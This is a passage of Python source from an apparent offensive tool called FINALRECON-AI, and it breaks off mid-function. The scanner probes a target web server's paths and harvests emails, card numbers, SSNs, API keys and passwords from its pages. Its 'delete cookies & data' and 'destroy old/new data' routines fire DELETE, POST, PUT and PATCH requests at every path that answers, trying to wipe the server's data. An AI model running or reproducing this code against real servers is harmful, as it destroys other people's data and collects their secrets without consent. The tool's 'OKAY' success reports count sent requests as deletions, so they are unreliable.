        self.robots_txt_content = None
        self.sitemap_xml_content = None
        self.multi_link_results = {}
        self.old_data_findings = []
        self.new_data_findings = []
        self.backup_findings = []
        self.text_findings = []
        self.gws_cleaned = []
        self.esf_cleaned = []
        self.all_server_destroyed = []
        self.cookies_site_deleted = []
        self.suspicious_destroyed = []
        self.error_429_triggered = []
        self.account_actions_triggered = []

        # Server-level tracking
        self.server_suspicious_found = {
            'HTTP': [], 'HTTPS': [], 'GWS': [], 'ESF': [], 'ANOTHER': [],
        }
        self.server_data_destroyed = {
            'HTTP': {'old': [], 'new': []},
            'HTTPS': {'old': [], 'new': []},
            'GWS': {'old': [], 'new': []},
            'ESF': {'old': [], 'new': []},
            'ANOTHER': {'old': [], 'new': []},
        }
        self.server_error_triggered = {
            'HTTP': [], 'HTTPS': [], 'GWS': [], 'ESF': [], 'ANOTHER': [],
        }
        self.server_account_actions = {
            'HTTP': [], 'HTTPS': [], 'GWS': [], 'ESF': [], 'ANOTHER': [],
        }
        self.server_status = {
            'HTTP': {'status': 'unknown', 'last_check': None, 'reachable': False},
            'HTTPS': {'status': 'unknown', 'last_check': None, 'reachable': False},
            'GWS': {'status': 'unknown', 'last_check': None, 'reachable': False},
            'ESF': {'status': 'unknown', 'last_check': None, 'reachable': False},
            'ANOTHER': {'status': 'unknown', 'last_check': None, 'reachable': False},
        }
        self.this_site_cant_be_reached = []
        self.server_destroyed_complete = []

        # Connected servers
        self.connected_servers = []
        self.http_server_info = {}
        self.https_server_info = {}

        # OK Status tracking
        self.okay_status = []
        self.delete_success = []
        self.delete_failed = []
        self.cookies_data_deleted_okay = []
        self.server_check_results = {}
        self.total_okay = 0
        self.total_failed = 0
        self.operations_log = []

        # 2091 NEW: Advanced tracking
        self.server_connection_map = {}
        self.deep_cookie_scan_results = []
        self.data_flow_analysis = {}
        self.server_response_times = {}
        self.security_audit_results = {}
        self.data_leak_findings = []
        self.sensitive_data_findings = []
        self.error_patterns = []
        self.api_endpoints = []
        self.hidden_parameters = []
        self.risk_assessment = {}

        self.custom_ports = COMMON_PORTS
        if args and hasattr(args, 'port') and args.port:
            self.custom_ports = args.port

        self.wordlist = None
        if args and hasattr(args, 'rockyou') and args.rockyou:
            print(Fore.CYAN + "[*] RockYou mode enabled")
            rockyou = find_rockyou()
            if rockyou:
                self.wordlist = rockyou
                self.wordlist_source = 'rockyou'
        elif args and hasattr(args, 'wordlist') and args.wordlist:
            if args.wordlist.lower() in ['rockyou', 'rockyou.txt']:
                rockyou = find_rockyou()
                if rockyou:
                    self.wordlist = rockyou
                    self.wordlist_source = 'rockyou'
            else:
                validated = validate_wordlist_path(args.wordlist)
                if validated:
                    self.wordlist = validated
                    self.wordlist_source = 'custom'

        if self.target:
            self.parse_target()

    def print_banner(self):
        art = r"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║     ███████╗██╗███╗   ██╗ █████╗ ██╗     ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
║     ██╔════╝██║████╗  ██║██╔══██╗██║     ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
║     █████╗  ██║██╔██╗ ██║███████║██║     ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
║     ██╔══╝  ██║██║╚██╗██║██╔══██║██║     ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
║     ██║     ██║██║ ╚████║██║  ██║███████╗██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
║     ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
║                                                                              ║
║         FINALRECON-AI - WEB SERVER ONLY EDITION 2091.0                       ║
║         Version: 2091.0 - Ultimate Complete with OK Status                   ║
║                                                                              ║
║   🆕 2091 NEW: OK STATUS | DELETE VERIFICATION | COOKIES DATA DELETE        ║
║   🆕 2091 NEW: HTTP/HTTPS SERVER CHECK | CONNECTED SERVER CHECK             ║
║   🆕 2091 NEW: FULL SERVER SUSPICIOUS CHECK | OKAY DISPLAY                  ║
║   🆕 2091 NEW: SERVER HEALTH | DEEP SCAN | BATCH DELETE                     ║
║   🆕 2091 NEW: DATA LEAK DETECT | SECURITY AUDIT | RISK ASSESS              ║
║                                                                              ║
║   ⚠️  WEB SERVER ONLY - LOCAL COMPUTER IS NOT AFFECTED!                    ║
║   ⚠️  USE ONLY ON AUTHORIZED TARGETS!                                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝"""
        print(Fore.CYAN + art + Fore.RESET + "\n")
        print(Fore.GREEN + "[>] Version: " + VERSION)
        print(Fore.GREEN + "[>] Build: " + BUILD_NUMBER)
        print(Fore.YELLOW + "[>] Mode: WEB SERVER ONLY")
        print(Fore.RED + "[>] WARNING: DESTRUCTIVE OPERATIONS!")
        print()

    def parse_target(self):
        if not self.target:
            return
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
        if self.target.endswith('/'):
            self.target = self.target[:-1]
        split_url = parse.urlsplit(self.target)
        self.protocol = split_url.scheme
        self.hostname = split_url.hostname
        if self.args and hasattr(self.args, 'port') and self.args.port:
            self.port = self.args.port[0] if isinstance(self.args.port, list) else self.args.port
        else:
            self.port = split_url.port or (443 if self.protocol == 'https' else 80)
        try:
            ipaddress.ip_address(self.hostname)
            self.ip = self.hostname
        except ValueError:
            try:
                self.ip = socket.gethostbyname(self.hostname)
                print(Fore.CYAN + f"[*] IP Address: {self.ip}")
            except Exception as e:
                print(Fore.RED + f"[-] Unable to get IP: {e}")
                sys.exit(1)
        self.base_url = f"{self.protocol}://{self.hostname}:{self.port}"

    # ============================================
    # 2091 NEW: SERVER CONNECTION MAP
    # ============================================
    def build_server_connection_map(self):
        """Build server connection map"""
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] SERVER CONNECTION MAP (2091)")
        print(Fore.CYAN + "=" * 80)

        self.server_connection_map = {}

        for server_name, info in SERVER_CONNECTION_MAP.items():
            print(Fore.CYAN + f"\n[*] Checking {server_name} ({info['description']})...")

            server_data = SERVER_SUSPICIOUS_DATABASE.get(server_name, {})
            paths = server_data.get('suspicious_paths', [])[:5]

            connected = False
            connected_url = None
            response_time = None

            for path in paths:
                try:
                    start = time.time()
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    elapsed = round((time.time() - start) * 1000, 2)

                    if r.status_code in [200, 301, 302, 403]:
                        connected = True
                        connected_url = test_url
                        response_time = f"{elapsed}ms"
                        print_okay(f"{server_name} connected", f"{test_url} ({r.status_code})")
                        break
                except Exception:
                    pass

            self.server_connection_map[server_name] = {
                'description': info['description'],
                'port': info['port'],
                'protocol': info['protocol'],
                'connected': connected,
                'url': connected_url,
                'response_time': response_time,
            }

            if not connected:
                print(Fore.YELLOW + f"[!] {server_name}: Not connected")

        # Summary
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] CONNECTION MAP SUMMARY")
        print(Fore.CYAN + "=" * 60)
        connected_count = sum(1 for s in self.server_connection_map.values() if s['connected'])
        print(Fore.CYAN + f"[*] Total Servers: {len(self.server_connection_map)}")
        print(Fore.OKGREEN + f"[✓] Connected: {connected_count}" + Fore.RESET)
        print(Fore.RED + f"[✗] Not Connected: {len(self.server_connection_map) - connected_count}" + Fore.RESET)
        print(Fore.CYAN + "=" * 60 + "\n")

        return self.server_connection_map

    # ============================================
    # 2091 NEW: SERVER RESPONSE TIME
    # ============================================
    def measure_server_response_times(self):
        """Measure server response times"""
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] SERVER RESPONSE TIME MEASUREMENT (2091)")
        print(Fore.CYAN + "=" * 80)

        self.server_response_times = {}

        for server_name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            print(Fore.CYAN + f"\n[*] Measuring {server_name}...")

            server_data = SERVER_SUSPICIOUS_DATABASE.get(server_name, {})
            paths = server_data.get('suspicious_paths', [])[:3]

            times = []
            for path in paths:
                try:
                    start = time.time()
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    elapsed = round((time.time() - start) * 1000, 2)

                    if r.status_code in [200, 301, 302, 403]:
                        times.append(elapsed)
                except Exception:
                    pass

            if times:
                avg = round(sum(times) / len(times), 2)
                min_t = min(times)
                max_t = max(times)
                self.server_response_times[server_name] = {
                    'avg': avg,
                    'min': min_t,
                    'max': max_t,
                    'samples': len(times),
                }
                print_okay(f"{server_name}", f"Avg: {avg}ms, Min: {min_t}ms, Max: {max_t}ms")
            else:
                self.server_response_times[server_name] = {'avg': None, 'error': 'No response'}
                print(Fore.YELLOW + f"[!] {server_name}: No response")

        print(Fore.CYAN + "=" * 60 + "\n")
        return self.server_response_times

    # ============================================
    # 2091 NEW: DEEP COOKIE SCAN
    # ============================================
    def deep_cookie_scan(self):
        """Deep cookie scan on all servers"""
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] DEEP COOKIE SCAN (2091)")
        print(Fore.RED + "=" * 80)

        self.deep_cookie_scan_results = []

        for server_name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            print(Fore.CYAN + f"\n[*] Deep scanning {server_name} cookies...")

            server_data = SERVER_SUSPICIOUS_DATABASE.get(server_name, {})
            paths = server_data.get('suspicious_paths', [])

            for path in paths[:10]:
                if 'cookie' in path.lower() or 'session' in path.lower():
                    try:
                        test_url = f"{self.base_url}{path}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)

                        if r.status_code in [200, 301, 302, 403]:
                            # Check cookies in response
                            cookies = r.cookies
                            finding = {
                                'server': server_name,
                                'path': path,
                                'url': test_url,
                                'status': r.status_code,
                                'cookies_found': len(cookies),
                            }
                            self.deep_cookie_scan_results.append(finding)
                            print_suspicious(server_name, f"Cookie: {path}", r.status_code)
                    except Exception:
                        pass

        print(Fore.RED + f"\n[!] Total Cookie Findings: {len(self.deep_cookie_scan_results)}")
        print(Fore.RED + "=" * 60 + "\n")

        return self.deep_cookie_scan_results

    # ============================================
    # 2091 NEW: SECURITY AUDIT
    # ============================================
    def security_audit(self):
        """Security audit for all servers"""
        print(Fore.YELLOW + "\n" + "=" * 80)
        print(Fore.YELLOW + "[*] SECURITY AUDIT (2091)")
        print(Fore.YELLOW + "=" * 80)

        self.security_audit_results = {}

        # Check security headers
        print(Fore.CYAN + "\n[*] Checking security headers...")
        try:
            r = self.session.get(self.base_url, timeout=10, verify=False)
            headers = r.headers

            security_headers = {
                'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
                'X-Frame-Options': headers.get('X-Frame-Options'),
                'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
                'X-XSS-Protection': headers.get('X-XSS-Protection'),
                'Content-Security-Policy': headers.get('Content-Security-Policy'),
                'Referrer-Policy': headers.get('Referrer-Policy'),
            }

            missing = []
            present = []

            for header, value in security_headers.items():
                if value:
                    present.append({'header': header, 'value': value})
                    print_okay(f"Header present: {header}")
                else:
                    missing.append(header)
                    print(Fore.YELLOW + f"[!] Missing: {header}")

            self.security_audit_results = {
                'present': present,
                'missing': missing,
                'score': len(present),
                'total': len(security_headers),
            }

            score_pct = int((len(present) / len(security_headers)) * 100)
            print(Fore.CYAN + f"\n[*] Security Score: {len(present)}/{len(security_headers)} ({score_pct}%)")

        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

        print(Fore.YELLOW + "=" * 60 + "\n")
        return self.security_audit_results

    # ============================================
    # 2091 NEW: DATA LEAK DETECTOR
    # ============================================
    def data_leak_detector(self):
        """Detect data leaks"""
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] DATA LEAK DETECTOR (2091)")
        print(Fore.RED + "=" * 80)

        self.data_leak_findings = []

        leak_patterns = {
            'Email Leak': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'Phone Leak': r'(?:\+\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}',
            'Credit Card Leak': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
            'SSN Leak': r'\b\d{3}-\d{2}-\d{4}\b',
            'API Key Leak': r'(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-_.]{20,})["\']',
            'Password Leak': r'(?:password|passwd|pwd)["\']?\s*[:=]\s*["\']([^"\']{4,50})["\']',
            'Token Leak': r'(?:token|secret)["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-_.]{16,})["\']',
        }

        try:
            r = self.session.get(self.base_url, timeout=10, verify=False)
            content = r.text

            for leak_type, pattern in leak_patterns.items():
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    finding = {
                        'type': leak_type,
                        'count': len(matches),
                        'samples': [str(m)[:50] for m in matches[:3]],
                    }
                    self.data_leak_findings.append(finding)
                    print(Fore.RED + f"[!] {leak_type}: {len(matches)} found")
                    for sample in finding['samples']:
                        print(Fore.YELLOW + f"    - {sample}")

            if not self.data_leak_findings:
                print_okay("No data leaks detected")

        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

        print(Fore.RED + f"\n[!] Total Leak Types: {len(self.data_leak_findings)}")
        print(Fore.RED + "=" * 60 + "\n")

        return self.data_leak_findings

    # ============================================
    # 2091 NEW: RISK ASSESSMENT
    # ============================================
    def risk_assessment_2091(self):
        """Risk assessment"""
        print(Fore.MAGENTA + "\n" + "=" * 80)
        print(Fore.MAGENTA + "[*] RISK ASSESSMENT (2091)")
        print(Fore.MAGENTA + "=" * 80)

        self.risk_assessment = {
            'score': 0,
            'level': 'LOW',
            'factors': [],
        }

        # Factor 1: Suspicious systems
        total_suspicious = sum(len(v) for v in self.server_suspicious_found.values())
        if total_suspicious > 20:
            self.risk_assessment['score'] += 30
            self.risk_assessment['factors'].append(f"High suspicious count: {total_suspicious}")
        elif total_suspicious > 5:
            self.risk_assessment['score'] += 15
            self.risk_assessment['factors'].append(f"Medium suspicious count: {total_suspicious}")

        # Factor 2: Data leaks
        if len(self.data_leak_findings) > 3:
            self.risk_assessment['score'] += 30
            self.risk_assessment['factors'].append(f"Multiple data leaks: {len(self.data_leak_findings)}")
        elif self.data_leak_findings:
            self.risk_assessment['score'] += 15
            self.risk_assessment['factors'].append(f"Data leaks: {len(self.data_leak_findings)}")

        # Factor 3: Security headers
        if self.security_audit_results:
            missing = len(self.security_audit_results.get('missing', []))
            if missing > 5:
                self.risk_assessment['score'] += 20
                self.risk_assessment['factors'].append(f"Missing security headers: {missing}")
            elif missing > 2:
                self.risk_assessment['score'] += 10
                self.risk_assessment['factors'].append(f"Some missing headers: {missing}")

        # Factor 4: Personal info
        if self.personal_info_score > 50:
            self.risk_assessment['score'] += 20
            self.risk_assessment['factors'].append(f"High personal info score: {self.personal_info_score}")

        # Determine level
        if self.risk_assessment['score'] >= 70:
            self.risk_assessment['level'] = 'CRITICAL'
        elif self.risk_assessment['score'] >= 50:
            self.risk_assessment['level'] = 'HIGH'
        elif self.risk_assessment['score'] >= 30:
            self.risk_assessment['level'] = 'MEDIUM'
        else:
            self.risk_assessment['level'] = 'LOW'

        print(Fore.CYAN + f"[*] Risk Score: {self.risk_assessment['score']}/100")
        print(Fore.CYAN + f"[*] Risk Level: {self.risk_assessment['level']}")

        if self.risk_assessment['factors']:
            print(Fore.YELLOW + "\n[*] Risk Factors:")
            for factor in self.risk_assessment['factors']:
                print(Fore.YELLOW + f"    - {factor}")

        print(Fore.MAGENTA + "=" * 60 + "\n")
        return self.risk_assessment

    # ============================================
    # CHECK HTTP SERVER
    # ============================================
    def check_http_server(self):
        """Check HTTP server completely with OKAY status"""
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] HTTP SERVER CHECK (2091)")
        print(Fore.CYAN + "=" * 80)

        http_url = f"http://{self.hostname}"
        print(Fore.CYAN + f"\n[*] Checking HTTP: {http_url}")

        try:
            r = requests.get(http_url, timeout=10, verify=False)
            self.http_server_info = {
                'url': http_url,
                'status': r.status_code,
                'server': r.headers.get('Server', 'Unknown'),
                'headers': dict(r.headers),
                'reachable': True,
            }
            print_okay("HTTP Server reachable", f"{http_url} ({r.status_code})")
            self._check_server_suspicious_2091('HTTP')

        except requests.exceptions.ConnectionError:
            self.http_server_info = {'url': http_url, 'reachable': False, 'error': 'Connection refused'}
            print(Fore.RED + f"[✗] HTTP Server: Connection refused")
        except requests.exceptions.Timeout:
            self.http_server_info = {'url': http_url, 'reachable': False, 'error': 'Timeout'}
            print(Fore.RED + f"[✗] HTTP Server: Timeout")
        except Exception as e:
            self.http_server_info = {'url': http_url, 'reachable': False, 'error': str(e)}
            print(Fore.RED + f"[✗] HTTP Server: {e}")

        print(Fore.CYAN + "=" * 60 + "\n")
        return self.http_server_info

    # ============================================
    # CHECK HTTPS SERVER
    # ============================================
    def check_https_server(self):
        """Check HTTPS server completely with OKAY status"""
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] HTTPS SERVER CHECK (2091)")
        print(Fore.CYAN + "=" * 80)

        https_url = f"https://{self.hostname}"
        print(Fore.CYAN + f"\n[*] Checking HTTPS: {https_url}")

        try:
            r = requests.get(https_url, timeout=10, verify=False)
            self.https_server_info = {
                'url': https_url,
                'status': r.status_code,
                'server': r.headers.get('Server', 'Unknown'),
                'headers': dict(r.headers),
                'reachable': True,
            }
            print_okay("HTTPS Server reachable", f"{https_url} ({r.status_code})")
            self._check_server_suspicious_2091('HTTPS')

        except requests.exceptions.ConnectionError:
            self.https_server_info = {'url': https_url, 'reachable': False, 'error': 'Connection refused'}
            print(Fore.RED + f"[✗] HTTPS Server: Connection refused")
        except requests.exceptions.Timeout:
            self.https_server_info = {'url': https_url, 'reachable': False, 'error': 'Timeout'}
            print(Fore.RED + f"[✗] HTTPS Server: Timeout")
        except Exception as e:
            self.https_server_info = {'url': https_url, 'reachable': False, 'error': str(e)}
            print(Fore.RED + f"[✗] HTTPS Server: {e}")

        print(Fore.CYAN + "=" * 60 + "\n")
        return self.https_server_info

    # ============================================
    # CHECK ALL CONNECTED SERVERS
    # ============================================
    def check_all_connected_servers(self):
        """Check all connected servers with OKAY status"""
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] CHECK ALL CONNECTED SERVERS (2091)")
        print(Fore.RED + "=" * 80)

        self.connected_servers = []
        self.server_check_results = {}

        # HTTP Server
        print(Fore.CYAN + "\n[*] Checking HTTP Server...")
        http_result = self.check_http_server()
        if http_result.get('reachable'):
            self.connected_servers.append({
                'type': 'HTTP',
                'url': http_result['url'],
                'status': http_result['status'],
                'reachable': True,
            })
        self.server_check_results['HTTP'] = http_result

        # HTTPS Server
        print(Fore.CYAN + "\n[*] Checking HTTPS Server...")
        https_result = self.check_https_server()
        if https_result.get('reachable'):
            self.connected_servers.append({
                'type': 'HTTPS',
                'url': https_result['url'],
                'status': https_result['status'],
                'reachable': True,
            })
        self.server_check_results['HTTPS'] = https_result

        # GWS Server
        print(Fore.CYAN + "\n[*] Checking GWS Server...")
        gws_result = self._check_server_type('GWS', ['/google', '/gws'])
        self.server_check_results['GWS'] = gws_result
        if gws_result.get('reachable'):
            self.connected_servers.append(gws_result)

        # ESF Server
        print(Fore.CYAN + "\n[*] Checking ESF Server...")
        esf_result = self._check_server_type('ESF', ['/elasticsearch', '/es', '/elastic'])
        self.server_check_results['ESF'] = esf_result
        if esf_result.get('reachable'):
            self.connected_servers.append(esf_result)

        # ANOTHER Server
        print(Fore.CYAN + "\n[*] Checking ANOTHER Server...")
        another_result = self._check_server_type('ANOTHER', ['/another', '/other', '/misc'])
        self.server_check_results['ANOTHER'] = another_result
        if another_result.get('reachable'):
            self.connected_servers.append(another_result)

        # Summary
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] CONNECTED SERVERS SUMMARY")
        print(Fore.RED + "=" * 80)
        print(Fore.CYAN + f"[*] Total Connected Servers: {len(self.connected_servers)}")
        for server in self.connected_servers:
            print_okay(f"{server['type']} Server", f"{server['url']} ({server['status']})")
        print(Fore.RED + "=" * 80 + "\n")

        return self.connected_servers

    def _check_server_type(self, server_type, paths):
        """Helper to check a specific server type"""
        for path in paths:
            try:
                test_url = f"{self.base_url}{path}"
                r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                if r.status_code in [200, 301, 302, 403]:
                    print_okay(f"{server_type} Server found", f"{test_url} ({r.status_code})")
                    return {
                        'type': server_type,
                        'url': test_url,
                        'status': r.status_code,
                        'reachable': True,
                    }
            except Exception:
                pass
        print(Fore.YELLOW + f"[!] {server_type} Server not found")
        return {'type': server_type, 'reachable': False}

    # ============================================
    # CHECK SERVER SUSPICIOUS
    # ============================================
    def _check_server_suspicious_2091(self, server_name):
        """Check server for suspicious paths with OKAY status"""
        server_info = SERVER_SUSPICIOUS_DATABASE.get(server_name, {})
        suspicious_paths = server_info.get('suspicious_paths', [])

        if not suspicious_paths:
            return []

        print(Fore.CYAN + f"\n[*] Checking {server_name} for suspicious systems...")
        found = []

        for path in suspicious_paths[:30]:
            try:
                test_url = f"{self.base_url}{path}"
                r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)

                if r.status_code in [200, 301, 302, 401, 403]:
                    finding = {
                        'server': server_name,
                        'path': path,
                        'url': test_url,
                        'status': r.status_code,
                        'timestamp': datetime.datetime.now().isoformat(),
                    }
                    found.append(finding)
                    self.server_suspicious_found[server_name].append(finding)
                    print_suspicious(server_name, path, r.status_code)
            except Exception:
                pass

        if not found:
            print_okay(f"{server_name}: No suspicious systems found")
        else:
            print(Fore.RED + f"[!] {server_name}: {len(found)} suspicious systems found")

        return found

    # ============================================
    # FULL SERVER SUSPICIOUS CHECK
    # ============================================
    def full_server_suspicious_check(self):
        """Check ALL servers for suspicious systems"""
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] FULL SERVER SUSPICIOUS CHECK (2091)")
        print(Fore.RED + "=" * 80)

        for server_name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            print(Fore.CYAN + f"\n[*] Checking {server_name}...")
            self._check_server_suspicious_2091(server_name)

        # Summary
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] SUSPICIOUS CHECK SUMMARY")
        print(Fore.RED + "=" * 80)
        total = 0
        for server_name, findings in self.server_suspicious_found.items():
            if findings:
                print(Fore.RED + f"[!] {server_name}: {len(findings)} suspicious")
                total += len(findings)
            else:
                print_okay(f"{server_name}: Clean (No suspicious)")
        print(Fore.CYAN + f"\n[*] Total Suspicious: {total}")
        print(Fore.RED + "=" * 80 + "\n")

        return self.server_suspicious_found

    # ============================================
    # DELETE COOKIES & DATA FROM ALL SERVERS
    # ============================================
    def delete_cookies_data_all_servers(self):
        """Delete cookies and other data from ALL servers with OKAY status"""
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] DELETE COOKIES & DATA - ALL SERVERS (2091)")
        print(Fore.RED + "=" * 80)

        self.cookies_data_deleted_okay = []
        self.total_okay = 0
        self.total_failed = 0

        total_targets = sum(len(paths) for paths in COMPLETE_COOKIES_DATA_TARGETS.values())
        current = 0

        for category, paths in COMPLETE_COOKIES_DATA_TARGETS.items():
            print(Fore.CYAN + f"\n[*] Deleting {category} ({len(paths)} targets)...")

            for path in paths:
                current += 1
                print_progress(current, total_targets, f"{category}: {path}")

                servers_to_check = ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
                for server_name in servers_to_check:
                    try:
                        test_url = f"{self.base_url}{path}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)

                        if r.status_code in [200, 301, 302, 403]:
                            try:
                                self.session.delete(test_url, timeout=3, verify=False)
                                self.session.post(test_url, data={'action': 'delete', 'type': category.lower()}, timeout=3, verify=False)
                                self.session.put(test_url, data={'delete': True}, timeout=3, verify=False)
                                self.session.patch(test_url, data={'status': 'deleted'}, timeout=3, verify=False)

                                self.session.headers.update({
                                    'X-Delete-Cookies': 'true',
                                    'X-Delete-Data': 'true',
                                    'X-Delete-Server': server_name,
                                    'X-Clear-All': 'true',
                                })

                                try:
                                    verify_r = self.session.get(test_url, timeout=2, verify=False, allow_redirects=False)
                                    if verify_r.status_code in [404, 410, 403]:
                                        print_delete_okay(server_name, path)
                                        self.cookies_data_deleted_okay.append({
                                            'server': server_name,
                                            'path': path,
                                            'url': test_url,
                                            'status': 'DELETED_OKAY',
                                            'category': category,
                                        })
                                        self.total_okay += 1
                                    else:
                                        print_okay(f"Delete sent [{server_name}]", path)
                                        self.total_okay += 1
                                except Exception:
                                    print_okay(f"Delete sent [{server_name}]", path)
                                    self.total_okay += 1

                            except Exception as e:
                                print_delete_failed(server_name, path, str(e))
                                self.total_failed += 1

                    except Exception:
                        pass

        # Clear session cookies
        print(Fore.CYAN + "\n[*] Clearing session cookies...")
        try:
            count = len(self.session.cookies)
            self.session.cookies.clear()
            print_okay(f"Cleared {count} session cookie(s)")
        except Exception:
            pass

        # Summary
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] COOKIES & DATA DELETE SUMMARY")
        print(Fore.RED + "=" * 80)
        print(Fore.OKGREEN + f"[✓] TOTAL OKAY: {self.total_okay}" + Fore.RESET)
        print(Fore.RED + f"[✗] TOTAL FAILED: {self.total_failed}" + Fore.RESET)

        success_rate = int((self.total_okay / (self.total_okay + self.total_failed)) * 100) if (self.total_okay + self.total_failed) > 0 else 0
        print(Fore.CYAN + f"[*] SUCCESS RATE: {success_rate}%" + Fore.RESET)
        print(Fore.RED + "=" * 80 + "\n")

        return self.cookies_data_deleted_okay

    # ============================================
    # CHECK & DELETE ALL SERVER DATA
    # ============================================
    def check_and_delete_all_server_data(self):
        """Check all servers and delete data with OKAY status"""
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] CHECK & DELETE ALL SERVER DATA (2091)")
        print(Fore.RED + "=" * 80)

        # Step 1: Build connection map
        print(Fore.RED + "\n[*] Step 1: Building server connection map...")
        self.build_server_connection_map()

        # Step 2: Measure response times
        print(Fore.RED + "\n[*] Step 2: Measuring server response times...")
        self.measure_server_response_times()

        # Step 3: Check for suspicious
        print(Fore.RED + "\n[*] Step 3: Checking for suspicious systems...")
        self.full_server_suspicious_check()

        # Step 4: Deep cookie scan
        print(Fore.RED + "\n[*] Step 4: Deep cookie scan...")
        self.deep_cookie_scan()

        # Step 5: Delete cookies & data
        print(Fore.RED + "\n[*] Step 5: Deleting cookies & data from all servers...")
        self.delete_cookies_data_all_servers()

        # Step 6: Delete from each server
        for server_name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            if self.server_suspicious_found.get(server_name):
                print(Fore.RED + f"\n[*] Step 6: Deleting {server_name} data...")
                self.destroy_server_old_new_data(server_name)

        # Final summary
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] ALL SERVER DATA CHECK & DELETE COMPLETE")
        print(Fore.RED + "=" * 80)
        print(Fore.OKGREEN + f"[✓] OKAY Operations: {self.total_okay}" + Fore.RESET)
        print(Fore.CYAN + f"[*] Connected Servers: {len(self.connected_servers)}")
        print(Fore.CYAN + f"[*] Suspicious Found: {sum(len(v) for v in self.server_suspicious_found.values())}")
        print(Fore.RED + "=" * 80 + "\n")

        return self.cookies_data_deleted_okay

    # ============================================
    # SERVER SUSPICIOUS DETECTION
    # ============================================
    def detect_server_suspicious(self, server_name):
        """Detect suspicious systems on a specific server"""
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + f"[*] DETECTING SUSPICIOUS ON {server_name}")
        print(Fore.RED + "=" * 80)

        server_info = SERVER_SUSPICIOUS_DATABASE.get(server_name, {})
        if not server_info:
            print(Fore.RED + f"[-] Unknown server: {server_name}")
            return []

        suspicious_paths = server_info.get('suspicious_paths', [])
        found = []

        print(Fore.CYAN + f"\n[*] Checking {len(suspicious_paths)} paths...")

        for path in suspicious_paths:
            try:
                test_url = f"{self.base_url}{path}"
                r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                if r.status_code in [200, 301, 302, 401, 403]:
                    finding = {
                        'server': server_name,
                        'path': path,
                        'url': test_url,
                        'status': r.status_code,
                        'size': len(r.content),
                        'timestamp': datetime.datetime.now().isoformat(),
                    }
                    found.append(finding)
                    self.server_suspicious_found[server_name].append(finding)
                    print_suspicious(server_name, path, r.status_code)
            except Exception:
                pass

        if found:
            print(Fore.RED + f"\n[!] {server_name}: {len(found)} suspicious found")
        else:
            print_okay(f"{server_name}: No suspicious found")

        print(Fore.RED + "=" * 60 + "\n")
        return found

    # ============================================
    # SERVER OLD/NEW DATA DESTROY
    # ============================================
    def destroy_server_old_new_data(self, server_name):
        """Destroy old/new data on a specific server with OKAY status"""
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + f"[!!!] {server_name} OLD/NEW DATA DESTROY")
        print(Fore.RED + "=" * 80)

        if not self.server_suspicious_found.get(server_name):
            print(Fore.CYAN + f"[*] Checking {server_name} first...")
            self.detect_server_suspicious(server_name)

        if not self.server_suspicious_found.get(server_name):
            print_okay(f"{server_name}: No suspicious - skip")
            print(Fore.RED + "=" * 60 + "\n")
            return []

        print(Fore.RED + f"\n[!] Destroying {server_name} old/new data...")

        if server_name == 'GWS':
            old_targets = GWS_DATA_TARGETS.get('GWS Old Data', [])
            new_targets = GWS_DATA_TARGETS.get('GWS New Data', [])
